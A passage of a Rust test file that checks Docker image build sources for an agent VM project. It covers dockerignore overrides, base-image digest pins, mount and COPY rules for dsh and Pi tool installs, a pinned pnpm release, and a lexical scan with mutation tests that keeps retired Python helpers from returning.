    let _ = std::fs::remove_dir_all(&overridden);
    std::fs::create_dir_all(overridden.join("images/standard")).expect("override fixture");
    assert!(check_ignore_overrides(&overridden).is_ok(), "clean fixture");
    std::fs::write(overridden.join("images/Dockerfile.dockerignore"), "pnpm\n")
        .expect("override file");
    assert!(
        check_ignore_overrides(&overridden).is_err(),
        "accepted a Dockerfile-specific ignore override"
    );
    std::fs::remove_file(overridden.join("images/Dockerfile.dockerignore")).expect("remove");
    std::fs::write(
        overridden.join("images/standard/Dockerfile.dockerignore"),
        "pnpm\n",
    )
    .expect("standard override file");
    assert!(
        check_ignore_overrides(&overridden).is_err(),
        "accepted a standard Dockerfile ignore override"
    );
    let _ = std::fs::remove_dir_all(&overridden);

    let re_included = format!("{ignore}**/pin.json\n!pnpm/pin.json\n");
    assert!(
        !dockerignore_hidden(&re_included, "pnpm/pin.json"),
        "a later negation must re-include the path"
    );
    assert!(
        !dockerignore_hidden(&ignore, "pnpm/pin.json"),
        "the committed ignore file does not hide a listed input"
    );

    let identity = extension_identity(&extension).unwrap();
    let placeholder = format!("sha256:{}", "0".repeat(64));
    let extension_mutations: Vec<(&str, String)> = vec![
        (
            "missing identity default",
            extension.replace(
                &format!("ARG {BASE_IDENTITY_ARG}={identity}\n"),
                &format!("ARG {BASE_IDENTITY_ARG}\n"),
            ),
        ),
        (
            "non-digest identity",
            extension.replace(&identity, "agent-vm-base:local"),
        ),
        (
            "placeholded identity",
            extension.replace(&identity, &placeholder),
        ),
        (
            "uppercase identity",
            extension.replace(&identity, &identity.to_uppercase()),
        ),
        (
            "missing stage-local redeclaration",
            extension.replace(
                &format!("FROM ${{BASE_IMAGE}}\nARG {BASE_IDENTITY_ARG}\n"),
                "FROM ${BASE_IMAGE}\n",
            ),
        ),
        (
            "missing extension check",
            extension
                .lines()
                .filter(|line| !line.contains(BASE_EXTENSION_CHECK))
                .map(|line| format!("{line}\n"))
                .collect::<String>(),
        ),
        (
            "literal identity instead of the argument",
            extension.replace(&format!("\"${BASE_IDENTITY_ARG}\""), &identity),
        ),
    ];
    for (label, edited) in extension_mutations {
        assert_ne!(edited, extension, "{label}: mutation did not apply");
        assert!(
            extension_identity(&edited).is_err(),
            "accepted an extension mutation: {label}"
        );
    }
}

/// One shell-ish word plus whether any of it came from a quoted string.
struct Word {
    text: String,
    quoted: bool,
}

/// strip_comment drops a trailing shell/YAML comment. `$#`, `${x#y}` and a `#`
/// inside a quoted string are data, not a comment.
fn strip_comment(line: &str) -> &str {
    if line.trim_start().starts_with('#') {
        return "";
    }
    let bytes = line.as_bytes();
    let mut quote: Option<u8> = None;
    for (index, byte) in bytes.iter().enumerate() {
        match *byte {
            b'\'' | b'"' if quote == Some(*byte) => quote = None,
            b'\'' | b'"' if quote.is_none() => quote = Some(*byte),
            b'#' if quote.is_none() => {
                let previous = index.checked_sub(1).map(|before| bytes[before]);
                if previous.is_none_or(|byte| byte.is_ascii_whitespace()) {
                    return &line[..index];
                }
            }
            _ => {}
        }
    }
    line
}

fn is_program_text(name: &str) -> bool {
    name.starts_with("Dockerfile")
        || [".sh", ".py", ".mjs", ".js", ".yml", ".yaml"]
            .iter()
            .any(|extension| name.ends_with(extension))
}

/// split_commands breaks a line at unquoted shell separators, so each piece is
/// one simple command whose first word is the command position.
fn split_commands(line: &str) -> Vec<String> {
    let mut commands = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut escaped = false;
    for character in line.chars() {
        if escaped {
            current.push(character);
            escaped = false;
            continue;
        }
        match character {
            '\\' if quote != Some('\'') => {
                current.push(character);
                escaped = true;
            }
            '\'' | '"' if quote == Some(character) => {
                current.push(character);
                quote = None;
            }
            '\'' | '"' if quote.is_none() => {
                current.push(character);
                quote = Some(character);
            }
            ';' | '|' | '&' | '(' | ')' if quote.is_none() => {
                commands.push(std::mem::take(&mut current));
            }
            _ => current.push(character),
        }
    }
    commands.push(current);
    commands
}

fn shell_words(command: &str) -> Vec<Word> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut quoted = false;
    let mut started = false;
    let mut characters = command.chars().peekable();
    while let Some(character) = characters.next() {
        match character {
            '\'' | '"' => {
                quoted = true;
                started = true;
                for inner in characters.by_ref() {
                    if inner == character {
                        break;
                    }
                    current.push(inner);
                }
            }
            '\\' => {
                if let Some(next) = characters.next() {
                    current.push(next);
                    started = true;
                }
            }
            ' ' | '\t' => {
                if started {
                    words.push(Word {
                        text: std::mem::take(&mut current),
                        quoted,
                    });
                    quoted = false;
                    started = false;
                }
            }
            _ => {
                started = true;
                current.push(character);
            }
        }
    }
    if started {
        words.push(Word {
            text: current,
            quoted,
        });
    }
    words
}

fn is_python(word: &str) -> bool {
    let name = word.rsplit('/').next().unwrap_or(word);
    name == "env" || name == "python" || name.starts_with("python3") || name.starts_with("python2")
}

/// contract_reference reports a word that names the contract directory or a
/// retired helper, whichever way the caller spelled it.
fn contract_reference(word: &str) -> Option<&'static str> {
    for retired in RETIRED_HELPERS {
        if word.contains(retired) {
            return Some(retired);
        }
    }
    for marker in ["$CONTRACT", "${CONTRACT}", "/contract/", "recipe-contract/"] {
        if word.contains(marker) {
            return Some("a contract directory");
        }
    }
    None
}

fn command_offence(words: &[Word]) -> Option<String> {
    let mut index = 0;
    while index < words.len() {
        let word = &words[index].text;
        let assignment = !word.starts_with('-')
            && word.contains('=')
            && word.split('=').next().is_some_and(|name| {
                !name.is_empty()
                    && name
                        .chars()
                        .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
            });
        // Dockerfile instruction prefixes, wrappers and shell keywords all stand
        // before the command word.
        let keyword = matches!(
            word.as_str(),
            "RUN"
                | "CMD"
                | "ENTRYPOINT"
                | "sudo"
                | "exec"
                | "command"
                | "env"
                | "time"
                | "nohup"
                | "if"
                | "then"
                | "else"
                | "elif"
                | "do"
                | "while"
                | "until"
                | "!"
                | "="
                | "["
                | "-"
                | "run:"
        ) || word.starts_with("--kill-after=")
            || word.starts_with("--");
        if word == "xargs" {
            index += 1;
            while words
                .get(index)
                .is_some_and(|word| word.text.starts_with('-'))
            {
                index += 1;
            }
            continue;
        }
        if assignment || keyword || word.chars().all(|ch| ch.is_ascii_digit()) {
            index += 1;
            continue;
        }
        break;
    }
    let command = words.get(index)?;
    let mut arguments = index + 1;
    if command.text == "timeout" {
        // timeout [OPTIONS] DURATION COMMAND ...
        arguments += 1;
        while words
            .get(arguments)
            .is_some_and(|word| word.text.starts_with('-'))
        {
            arguments += 1;
        }
        arguments += 1;
    }
    let arguments = arguments.min(words.len());
    let python = is_python(&command.text);
    for word in &words[arguments..] {
        if python {
            if let Some(reason) = contract_reference(&word.text) {
                return Some(format!("{} runs {reason}", command.text));
            }
            continue;
        }
        // A non-Python command may legitimately read the contract directory
        // (`sh "$CONTRACT/run-report.sh"`, `COPY recipe-contract/ ./`); only an
        // unquoted retired helper name is the regression.
        if word.quoted {
            continue;
        }
        for retired in RETIRED_HELPERS {
            if word.text.contains(retired) {
                return Some(format!("{} invokes {retired}", command.text));
            }
        }
    }
    None
}

/// python_helper_offences lists every lexical offence under `root`. An empty
/// list is the only passing result.
fn python_helper_offences(root: &Path) -> Vec<String> {
    // The repository's own program text: image sources, harness scripts and the
    // workflows that run both. Untracked scratch trees (.pi, target, docs) are
    // outside the claim.
    const SCANNED_ROOTS: [&str; 3] = ["images", "script", ".github"];
    let mut offences = Vec::new();
    let roots = SCANNED_ROOTS
        .iter()
        .map(|relative| root.join(relative))
        .filter(|directory| directory.is_dir())
        .collect();
    for path in source_files(roots, &["target", "__pycache__", ".git"]) {
        let path = match path {
            Ok(path) => path,
            Err(error) => {
                offences.push(error);
                continue;
            }
        };
        let name = path
            .file_name()
            .expect("file name")
            .to_string_lossy()
            .to_string();
        let relative = path.strip_prefix(root).unwrap_or(&path).to_path_buf();
        let bytes = match std::fs::read(&path) {
            Ok(bytes) => bytes,
            Err(error) => {
                offences.push(format!("cannot read {}: {error}", path.display()));
                continue;
            }
        };
        if relative.starts_with("images/recipe-contract") {
            let extension = path.extension().and_then(|value| value.to_str());
            if matches!(extension, Some("py") | Some("pyc")) {
                offences.push(format!("python helper file returned: {}", path.display()));
            }
            let first_line = bytes.split(|byte| *byte == b'\n').next().unwrap_or(&[]);
            if first_line.starts_with(b"#!")
                && first_line.windows(6).any(|window| window == b"python")
            {
                offences.push(format!(
                    "python shebang helper returned: {}",
                    path.display()
                ));
            }
        }
        if !is_program_text(&name) {
            continue;
        }
        let text = String::from_utf8_lossy(&bytes);
        for line in text.lines() {
            let line = strip_comment(line);
            for command in split_commands(line) {
                if let Some(offence) = command_offence(&shell_words(&command)) {
                    offences.push(format!("{}: {line}: {offence}", path.display()));
                }
            }
        }
    }
    offences
}

#[test]
fn the_converted_helpers_stay_go_only() {
    let offences = python_helper_offences(&repo_path(""));
    assert!(
        offences.is_empty(),
        "the converted helpers must stay Go and shell only: {offences:#?}"
    );
}

/// A scratch tree holding only the files the lexical scan reads. Each control
/// starts from a copy of the live tree, so the baseline proves the rules do not
/// fire on today's sources and each mutation proves they fire on the regression
/// it names.
struct HelperTree {
    directory: PathBuf,
}

impl HelperTree {
    const FILES: [&'static str; 5] = [
        "images/Dockerfile",
        "images/standard/Dockerfile",
        "images/tools/claude/verify-claude.sh",
        ".github/workflows/contracts.yml",
        "script/test/tool-access.sh",
    ];

    fn copy(label: &str) -> Self {
        let directory = std::env::temp_dir().join(format!(
            "image-sources-helpers-{}-{label}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&directory);
        for file in Self::FILES {
            let destination = directory.join(file);
            std::fs::create_dir_all(destination.parent().expect("file parent"))
                .expect("fixture directory");
            std::fs::copy(repo_path(file), &destination).expect("copy live file");
        }
        let module = directory.join("images/recipe-contract");
        std::fs::create_dir_all(&module).expect("fixture module");
        for file in ["go.mod", "build.sh", "internal/cli/legacy_text.go"] {
            let destination = module.join(file);
            std::fs::create_dir_all(destination.parent().expect("module parent"))
                .expect("module directory");
            std::fs::copy(
                repo_path(&format!("images/recipe-contract/{file}")),
                destination,
            )
            .expect("copy module file");
        }
        Self { directory }
    }

    fn path(&self, relative: &str) -> PathBuf {
        self.directory.join(relative)
    }

    fn write(&self, relative: &str, bytes: &[u8]) {
        let path = self.path(relative);
        std::fs::create_dir_all(path.parent().expect("file parent")).expect("write parent");
        std::fs::write(path, bytes).expect("write fixture file");
    }

    fn append(&self, relative: &str, text: &str) {
        let before = std::fs::read_to_string(self.path(relative)).expect("read fixture file");
        self.write(relative, format!("{before}{text}").as_bytes());
    }

    fn offences(&self) -> Vec<String> {
        python_helper_offences(&self.directory)
    }
}

impl Drop for HelperTree {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.directory);
    }
}

#[test]
fn the_python_return_guard_rejects_every_evasion() {
    let baseline = HelperTree::copy("baseline");
    assert!(
        baseline.offences().is_empty(),
        "the scratch copy of the live tree must pass: {:#?}",
        baseline.offences()
    );

    // The restored oracle source: a `.py` file inside the converted module.
    let restored = HelperTree::copy("restored-python");
    restored.write(
        "images/recipe-contract/check-tool-access.py",
        b"#!/usr/bin/env python3\nprint('restored')\n",
    );
    assert!(
        restored
            .offences()
            .iter()
            .any(|offence| offence.contains("python helper file")),
        "{:#?}",
        restored.offences()
    );

    // A renamed helper: no extension, a Python shebang.
    let renamed = HelperTree::copy("renamed-helper");
    renamed.write(
        "images/recipe-contract/tool-access",
        b"#!/usr/bin/env python3\nprint('renamed')\n",
    );
    assert!(
        renamed
            .offences()
            .iter()
            .any(|offence| offence.contains("python shebang")),
        "{:#?}",
        renamed.offences()
    );

    // The same helper with one non-UTF8 byte: the scan reads bytes, so the
    // shebang on line one still proves what the file is.
    let mut invalid = b"#!/usr/bin/env python3\n# ".to_vec();
    invalid.push(0xFF);
    invalid.extend_from_slice(b"\nprint('renamed')\n");
    let invalid_tree = HelperTree::copy("non-utf8-helper");
    invalid_tree.write("images/recipe-contract/tool-access", &invalid);
    assert!(
        invalid_tree
            .offences()
            .iter()
            .any(|offence| offence.contains("python shebang")),
        "{:#?}",
        invalid_tree.offences()
    );

    // A compiled module is executable Python even though nothing names it.
    let compiled = HelperTree::copy("compiled-module");
    compiled.write(
        "images/recipe-contract/py/__init__.pyc",
        b"\x00\x00\x00\x0d",
    );
    assert!(
        compiled
            .offences()
            .iter()
            .any(|offence| offence.contains("python helper file")),
        "{:#?}",
        compiled.offences()
    );

    // A shebang-less helper is only visible through its caller.
    let shebangless = HelperTree::copy("shebang-less");
    shebangless.write("images/recipe-contract/tool_access", b"print('helper')\n");
    shebangless.append(
        "images/tools/claude/verify-claude.sh",
        "python3 \"$CONTRACT/tool_access\" claude\n",
    );
    assert!(
        shebangless
            .offences()
            .iter()
            .any(|offence| offence.contains("tool_access")),
        "{:#?}",
        shebangless.offences()
    );

    // A Dockerfile RUN line executes a Python file from the contract mount.
    let dockerfile = HelperTree::copy("dockerfile-run");
    dockerfile.append(
        "images/standard/Dockerfile",
        "RUN python3 /tmp/recipe-contract/check-tool-access.py claude\n",
    );
    assert!(
        dockerfile
            .offences()
            .iter()
            .any(|offence| offence.contains("check-tool-access.py")),
        "{:#?}",
        dockerfile.offences()
    );

    // A workflow `run:` body is shell too.
    let workflow = HelperTree::copy("workflow-run");
    workflow.append(
        ".github/workflows/contracts.yml",
        "      - run: python3 images/recipe-contract/check-tool-access.py\n",
    );
    assert!(
        workflow
            .offences()
            .iter()
            .any(|offence| offence.contains("check-tool-access.py")),
        "{:#?}",
        workflow.offences()
    );

    // Workflow command prefixes and xargs must not hide a renamed helper.
    for (label, caller, bytes) in [
        (
            "workflow-one-line",
            ".github/workflows/contracts.yml",
            b"      - run: python3 images/recipe-contract/tool_access\n".as_slice(),
        ),
        (
            "workflow-run-key",
            ".github/workflows/contracts.yml",
            b"        run: python3 \"$CONTRACT/tool_access\"\n".as_slice(),
        ),
        (
            "xargs-python",
            "images/tools/claude/verify-claude.sh",
            b"xargs -0 python3 \"$CONTRACT/tool_access\"\n".as_slice(),
        ),
        (
            "non-utf8-caller",
            "images/tools/claude/verify-claude.sh",
            b"# \xff\npython3 \"$CONTRACT/tool_access\"\n".as_slice(),
        ),
    ] {
        let tree = HelperTree::copy(label);
        tree.write("images/recipe-contract/tool_access", b"print('helper')\n");
        let mut content = std::fs::read(tree.path(caller)).expect("read caller");
        content.extend_from_slice(bytes);
        tree.write(caller, &content);
        assert!(
            tree.offences()
                .iter()
                .any(|offence| offence.contains("tool_access")),
            "{label}: {:#?}",
            tree.offences()
        );
    }

    let literal = HelperTree::copy("compatibility-literal");
    literal.append(
        "script/test/tool-access.sh",
        "grep -q 'check-tool-access.py: unknown option' \"$log\"\n",
    );
    assert!(
        literal.offences().is_empty(),
        "a quoted compatibility literal must not be an offence: {:#?}",
        literal.offences()
    );

    // A Python heredoc names no contract path; contracts.sh's embedded-Python
    // gate owns that shape (documented gap above).
    let heredoc = HelperTree::copy("python-heredoc");
    heredoc.append(
        "images/tools/claude/verify-claude.sh",
        "python3 - <<'PY'\nprint('inline')\nPY\n",
    );
    assert!(heredoc.offences().is_empty(), "{:#?}", heredoc.offences());
}

/// The dsh block binds its own helper/validator/pnpm sources because the layer
/// is a reviewed pnpm project, not a single copied installer.
fn check_dsh_source_block(active: &str) -> Result<(), String> {
    let copy = "COPY tools/dsh/package.json tools/dsh/pnpm-lock.yaml tools/dsh/pnpm-workspace.yaml tools/dsh/pnpm-inputs.sha256 /opt/agent-vm/dsh/";
    if active.matches(copy).count() != 1 {
        return Err("dsh needs exactly one four-input COPY".into());
    }
    for (phase, script) in [
        ("install", "sh /tmp/dsh-source/install-dsh.sh"),
        ("verify", "sh /tmp/dsh-source/verify-dsh.sh"),
    ] {
        let instruction = active
            .lines()
            .find(|line| line.contains(script))
            .ok_or_else(|| format!("missing {phase}-dsh invocation"))?;
        for token in [
            RECIPE_CONTRACT_MOUNT,
            "--mount=type=bind,source=tools/dsh,target=/tmp/dsh-source,ro",
            "--mount=type=bind,source=pnpm,target=/tmp/pnpm-source,ro",
            "AGENT_INSTALL_SOFT_FAIL=",
            "AGENT_VM_DSH_SOURCE_DIR=/tmp/dsh-source",
            "PNPM_SOURCE_DIR=/tmp/pnpm-source",
        ] {
            if !instruction.split_whitespace().any(|word| word == token) {
                return Err(format!("dsh {phase} RUN misses {token}"));
            }
        }
    }
    let link =
        "ln -s /opt/agent-vm/dsh/node_modules/@deepseek-ai/dsh/lib/bin.js /usr/local/bin/dsh";
    let link_run = active
        .lines()
        .find(|line| line.contains(link))
        .ok_or("missing the dsh direct bin link")?;
    if active.matches(link).count() != 1 {
        return Err("dsh needs exactly one direct bin link".into());
    }
    for guard in [
        "test ! -e /usr/local/bin/dsh",
        "test ! -L /usr/local/bin/dsh",
    ] {
        if !link_run.contains(guard) {
            return Err(format!("dsh link RUN misses {guard}"));
        }
    }
    if active.contains(".bin/dsh") {
        return Err(
            "dsh must link the installed lib entrypoint, not a generated .bin wrapper".into(),
        );
    }
    Ok(())
}

/// The Pi block binds the whole tool directory (preparation driver, converter,
/// extractor, installed-graph and byte/runtime checkers, dispatch data), the
/// shared project module at the sibling path both adapters resolve, the pnpm
/// sources and the composed helper. Every helper is a mount: a COPY would put
/// the archive parser and byte comparator in the runtime layer.
fn check_pi_source_block(active: &str) -> Result<(), String> {
    for (prefix, target) in [
        ("tools/pi", "/opt/agent-vm/pi/"),
        ("tools/pi/bridge", "/opt/agent-vm/pi-packages/"),
    ] {
        let copy = format!(
            "COPY {prefix}/package.json {prefix}/pnpm-lock.yaml {prefix}/pnpm-workspace.yaml \
             {prefix}/pnpm-inputs.sha256 {target}"
        );
        if active.matches(&copy).count() != 1 {
            return Err(format!("{target} needs exactly one four-input COPY"));
        }
        if active.contains(&format!("COPY {prefix}/package-lock.json")) {
            return Err(format!("{target} must not COPY an npm project lock"));
        }
    }
    for (phase, script) in phase_invocations("pi") {
        let instruction = active
            .lines()
            .find(|line| line.contains(&script))
            .ok_or_else(|| format!("missing {phase}-pi invocation"))?;
        for token in [
            RECIPE_CONTRACT_MOUNT,
            "--mount=type=bind,source=tools/pi,target=/tmp/standard-tools/pi,ro",
            "--mount=type=bind,source=tools/pnpm-project.py,target=/tmp/standard-tools/pnpm-project.py,ro",
            "--mount=type=bind,source=tools/pnpm-host-manager.py,target=/tmp/standard-tools/pnpm-host-manager.py,ro",
            "--mount=type=bind,source=pnpm,target=/tmp/pnpm-source,ro",
            "AGENT_INSTALL_SOFT_FAIL=",
            "AGENT_VM_PI_SOURCE_DIR=/tmp/standard-tools/pi",
            "AGENT_VM_PI_SHARED=/tmp/standard-tools/pnpm-project.py",
            "PNPM_SOURCE_DIR=/tmp/pnpm-source",
        ] {
            if !instruction.split_whitespace().any(|word| word == token) {
                return Err(format!("pi {phase} RUN misses {token}"));
            }
        }
    }
    let bridge_install = active
        .lines()
        .find(|line| line.contains("sh /tmp/standard-tools/pi/install-pi-packages.sh"))
        .ok_or("missing install-pi-packages invocation")?;
    for token in [
        RECIPE_CONTRACT_MOUNT,
        "--mount=type=bind,source=tools/pi,target=/tmp/standard-tools/pi,ro",
        "--mount=type=bind,source=tools/pnpm-project.py,target=/tmp/standard-tools/pnpm-project.py,ro",
        "--mount=type=bind,source=tools/pnpm-host-manager.py,target=/tmp/standard-tools/pnpm-host-manager.py,ro",
        "--mount=type=bind,source=pnpm,target=/tmp/pnpm-source,ro",
        "AGENT_INSTALL_SOFT_FAIL=",
        "AGENT_VM_PI_SOURCE_DIR=/tmp/standard-tools/pi",
        "AGENT_VM_PI_SHARED=/tmp/standard-tools/pnpm-project.py",
        "PNPM_SOURCE_DIR=/tmp/pnpm-source",
    ] {
        if !bridge_install.split_whitespace().any(|word| word == token) {
            return Err(format!("bridge install RUN misses {token}"));
        }
    }
    // The byte checker and the target platform travel as explicit values: the
    // host is never guessed and a default path is never relied on.
    let install = active
        .lines()
        .find(|line| line.contains(&phase_invocations("pi")[0].1))
        .ok_or("missing install-pi invocation")?;
    for token in [
        "AGENT_VM_PI_BYTES_CHECK=/tmp/standard-tools/pi/check-installed-bytes.mjs",
        "AGENT_VM_PI_TARGET_PLATFORM=linux/${TARGETARCH}",
        "AGENT_VM_PI_WORK_DIR=/tmp/pi-verify",
    ] {
        if !install.contains(token) {
            return Err(format!("pi install RUN misses {token}"));
        }
    }
    // The mounted typescript source is build-only, so the runtime keeps the
    // wrapper and the seed as the only executable Pi artefacts.
    if active.contains("COPY tools/pi/prepare-project.py")
        || active.contains("COPY tools/pi/check-installed-bytes.mjs")
    {
        return Err("a build-only Pi helper is COPYed into the layer".into());
    }
    Ok(())
}

// Narrow presence checks over active continued instructions, not a layer parser.
fn check_standard_blocks(text: &str) -> Result<(), String> {
    let active = text
        .lines()
        .filter(|l| !l.trim_start().starts_with('#'))
        .collect::<Vec<_>>()
        .join("\n")
        .replace("\\\n", " ");
    // Two stages: the build-only helper compiler and the one product stage.
    if active
        .lines()
        .filter(|l| l.trim_start().starts_with("FROM "))
        .count()
        != 2
    {
        return Err("standard must have the builder stage and one product stage".into());
    }
    check_recipe_contract_builder(text)?;
    for tool in RECIPES {
        for (phase, script) in phase_invocations(tool) {
            if !active.contains(&script) {
                return Err(format!("missing {phase}-{tool} invocation"));
            }
        }
    }
    check_dsh_source_block(&active)?;
    check_pi_source_block(&active)?;
    if !active.contains("sh /tmp/verify-standard.sh") {
        return Err("missing final gate".into());
    }
    if active.contains("ARG AGENT_INSTALL_SOFT_FAIL")
        || active.contains("SKIP_AGENT")
        || active.contains("skip-agent")
    {
        return Err("degraded interface".into());
    }
    if active.contains("source=contract") || !active.contains("source=/out") {
        return Err("noncanonical helpers".into());
    }
    for instruction in active
        .lines()
        .filter(|l| l.trim_start().starts_with("RUN "))
    {
        if (instruction.contains("sh /tmp/recipe-contract/run-install.sh")
            || instruction.contains("sh /tmp/verify-"))
            && !instruction.contains(RECIPE_CONTRACT_MOUNT)
        {
            return Err(
                "installer/audit RUN must mount the composed helper directory read-only".into(),
            );
        }
    }
    Ok(())
}
#[test]
fn standard_blocks_and_mutations() {
    let text = standard_dockerfile();
    check_standard_blocks(&text).unwrap();
    for tool in RECIPES {
        assert!(!repo_path(&format!("images/tools/{tool}/Dockerfile")).exists());
        assert!(!repo_path(&format!("images/tools/{tool}/contract")).exists());
        for (phase, script) in phase_invocations(tool) {
            assert!(text.contains(&script), "{phase}-{tool} must be invoked");
            assert!(
                check_standard_blocks(&text.replacen(&script, "true", 1)).is_err(),
                "{phase}-{tool}"
            );
        }
    }
    assert!(check_standard_blocks(&text.replace("sh /tmp/verify-standard.sh", "true")).is_err());
    for mutation in [
        "true",
        "--mount=from=recipe-contract-bin,source=/missing,target=/tmp/recipe-contract,ro",
        "--mount=from=missing-stage,source=/out,target=/tmp/recipe-contract,ro",
        "--mount=from=recipe-contract-bin,source=/out,target=/tmp/recipe-contract,rw",
    ] {
        let mutated = text.replacen(RECIPE_CONTRACT_MOUNT, mutation, 1);
        assert_ne!(mutated, text, "the mutation must change the mount");
        assert!(
            check_standard_blocks(&mutated).is_err(),
            "accepted mount mutation {mutation}"
        );
    }
    // Each dsh phase owns its own mount, so one RUN cannot borrow another's. Every
    // phase is mutated on its own mount: removed, wrong source, wrong stage and
    // writable. The claim recorded for the review was per-RUN, not first-RUN.
    for (phase, script) in phase_invocations("dsh") {
        let script_at = text.find(&script).expect("dsh script");
        let mount_at = text[..script_at]
            .rfind(RECIPE_CONTRACT_MOUNT)
            .expect("dsh mount precedes its script");
        for mutation in [
            "true",
            "--mount=from=recipe-contract-bin,source=/missing,target=/tmp/recipe-contract,ro",
            "--mount=from=missing-stage,source=/out,target=/tmp/recipe-contract,ro",
            "--mount=from=recipe-contract-bin,source=/out,target=/tmp/recipe-contract,rw",
        ] {
            let mut mutated = String::with_capacity(text.len());
            mutated.push_str(&text[..mount_at]);
            mutated.push_str(mutation);
            mutated.push_str(&text[mount_at + RECIPE_CONTRACT_MOUNT.len()..]);
            assert!(
                check_standard_blocks(&mutated).is_err(),
                "dsh {phase} mount accepted {mutation}"
            );
        }
    }
    // Every dsh RUN must bind its reviewed sources; the runtime verifier cannot
    // borrow another RUN's mount (or the final gate's) and stay certified.
    for mount in [
        "--mount=type=bind,source=tools/dsh,target=/tmp/dsh-source,ro",
        "--mount=type=bind,source=pnpm,target=/tmp/pnpm-source,ro",
    ] {
        let mutated = text.replace(mount, "--mount=type=bind,source=missing,ro");
        assert_ne!(mutated, text, "the mutation must change the mount");
        assert!(check_standard_blocks(&mutated).is_err(), "missing {mount}");
    }
    let without_soft_unset = text.replacen(
        "AGENT_INSTALL_SOFT_FAIL= \\\n",
        "AGENT_INSTALL_SOFT_FAIL=1 \\\n",
        1,
    );
    assert_ne!(without_soft_unset, text);
    assert!(
        check_standard_blocks(&without_soft_unset).is_err(),
        "a soft-fail input must be rejected"
    );
    let link = "RUN test ! -e /usr/local/bin/dsh && test ! -L /usr/local/bin/dsh && \\\n    ln -s /opt/agent-vm/dsh/node_modules/@deepseek-ai/dsh/lib/bin.js /usr/local/bin/dsh\n";
    assert!(text.contains(link), "the direct link RUN is discoverable");
    assert!(
        check_standard_blocks(&text.replacen(link, "RUN true\n", 1)).is_err(),
        "a missing direct bin link must be rejected"
    );
    assert!(
        check_standard_blocks(&text.replacen(
            "ln -s /opt/agent-vm/dsh/node_modules/@deepseek-ai/dsh/lib/bin.js /usr/local/bin/dsh",
            "ln -s /opt/agent-vm/dsh/node_modules/.bin/dsh /usr/local/bin/dsh",
            1,
        ))
        .is_err(),
        "a generated .bin wrapper must be rejected"
    );

    // The Pi block's mounts are per-RUN too: the preparation driver, the shared
    // module, the pnpm sources and the composed helper cannot be borrowed from
    // another RUN, and the bridge install cannot quietly drop back to a COPYed
    // installer. Each mount is mutated on its own phase.
    const PI_MOUNTS: [&str; 5] = [
        "--mount=type=bind,source=tools/pi,target=/tmp/standard-tools/pi,ro",
        "--mount=type=bind,source=tools/pnpm-project.py,target=/tmp/standard-tools/pnpm-project.py,ro",
        "--mount=type=bind,source=tools/pnpm-host-manager.py,target=/tmp/standard-tools/pnpm-host-manager.py,ro",
        "--mount=type=bind,source=pnpm,target=/tmp/pnpm-source,ro",
        RECIPE_CONTRACT_MOUNT,
    ];
    for (phase, script) in phase_invocations("pi") {
        let script_at = text.find(&script).expect("pi script");
        for mount in PI_MOUNTS {
            let mount_at = text[..script_at]
                .rfind(mount)
                .unwrap_or_else(|| panic!("{phase}-pi must precede {mount}"));
            let mutated = format!(
                "{}{}{}",
                &text[..mount_at],
                "--mount=type=bind,source=missing,ro",
                &text[mount_at + mount.len()..]
            );
            assert!(
                check_standard_blocks(&mutated).is_err(),
                "pi {phase} accepted a rewritten {mount}"
            );
        }
    }
    let bridge_script = "sh /tmp/standard-tools/pi/install-pi-packages.sh";
    let bridge_at = text.find(bridge_script).expect("bridge script");
    for mount in PI_MOUNTS {
        let mount_at = text[..bridge_at]
            .rfind(mount)
            .expect("bridge mount precedes the script");
        let mutated = format!(
            "{}{}{}",
            &text[..mount_at],
            "--mount=type=bind,source=missing,ro",
            &text[mount_at + mount.len()..]
        );
        assert!(
            check_standard_blocks(&mutated).is_err(),
            "bridge install accepted a rewritten {mount}"
        );
    }
    for mutation in [
        "AGENT_VM_PI_TARGET_PLATFORM=linux/${TARGETARCH}",
        "AGENT_VM_PI_BYTES_CHECK=/tmp/standard-tools/pi/check-installed-bytes.mjs",
        "AGENT_VM_PI_SHARED=/tmp/standard-tools/pnpm-project.py",
        "AGENT_VM_PI_WORK_DIR=/tmp/pi-verify",
    ] {
        let mutated = text.replacen(mutation, "AGENT_VM_UNUSED=1", 1);
        assert_ne!(mutated, text, "the mutation must change {mutation}");
        assert!(
            check_standard_blocks(&mutated).is_err(),
            "a dropped {mutation} must be rejected"
        );
    }
    // A COPYed build-only helper in place of its mount must be rejected.
    let copied = text.replacen(
        "--mount=type=bind,source=tools/pi,target=/tmp/standard-tools/pi,ro",
        "--mount=type=bind,source=tools/pi/install-pi.sh,target=/tmp/install-pi.sh,ro",
        1,
    );
    assert!(
        check_standard_blocks(&copied).is_err(),
        "whole-source mount is required"
    );
    let npm_copy = text.replacen(
        "COPY tools/pi/package.json tools/pi/pnpm-lock.yaml tools/pi/pnpm-workspace.yaml tools/pi/pnpm-inputs.sha256 /opt/agent-vm/pi/",
        "COPY tools/pi/package.json tools/pi/package-lock.json /opt/agent-vm/pi/",
        1,
    );
    assert_ne!(npm_copy, text);
    assert!(
        check_standard_blocks(&npm_copy).is_err(),
        "the four-input COPY must replace the two-file npm COPY"
    );
}

#[test]
fn base_pnpm_pin_and_launcher_ownership() {
    let pin = read_json("images/pnpm/pin.json");
    assert_eq!(pin["version"], "11.11.0");
    assert_eq!(
        pin["url"],
        "https://registry.npmjs.org/pnpm/-/pnpm-11.11.0.tgz"
    );
    assert_eq!(
        pin["sha512"],
        "4463f65fd80ed80d69bc1d4bf163ee94f605c7380fc318bb5b2ebe15f8cd12d49c51a4d59e951b401e764d3b6ca751cbf51bc50ed7001a6bcb4935e684c34882"
    );
    assert_eq!(
        pin["bundleSha256"],
        "e8abc02d5fbffb8f9d8817d44d6eee84c379ea8d5006dd5aa8694bb5e4428d8a"
    );
    assert_eq!(
        read_json("images/tools/dsh/package.json")["packageManager"],
        format!(
            "pnpm@{}",
            pin["version"]
                .as_str()
                .expect("the base pin carries a version")
        ),
        "the dsh manifest asserts the base pin instead of selecting a manager"
    );
    let manifest = read_json("images/tools/dsh/package.json");
    assert!(
        manifest["dependencies"].get("pnpm").is_none(),
        "the dsh project must not depend on pnpm"
    );
    let graph = read_graph(&MigratedProject::committed("dsh", "images/tools/dsh"))
        .expect("the reviewed dsh inputs form a valid graph");
    assert!(
        !graph.carries("pnpm"),
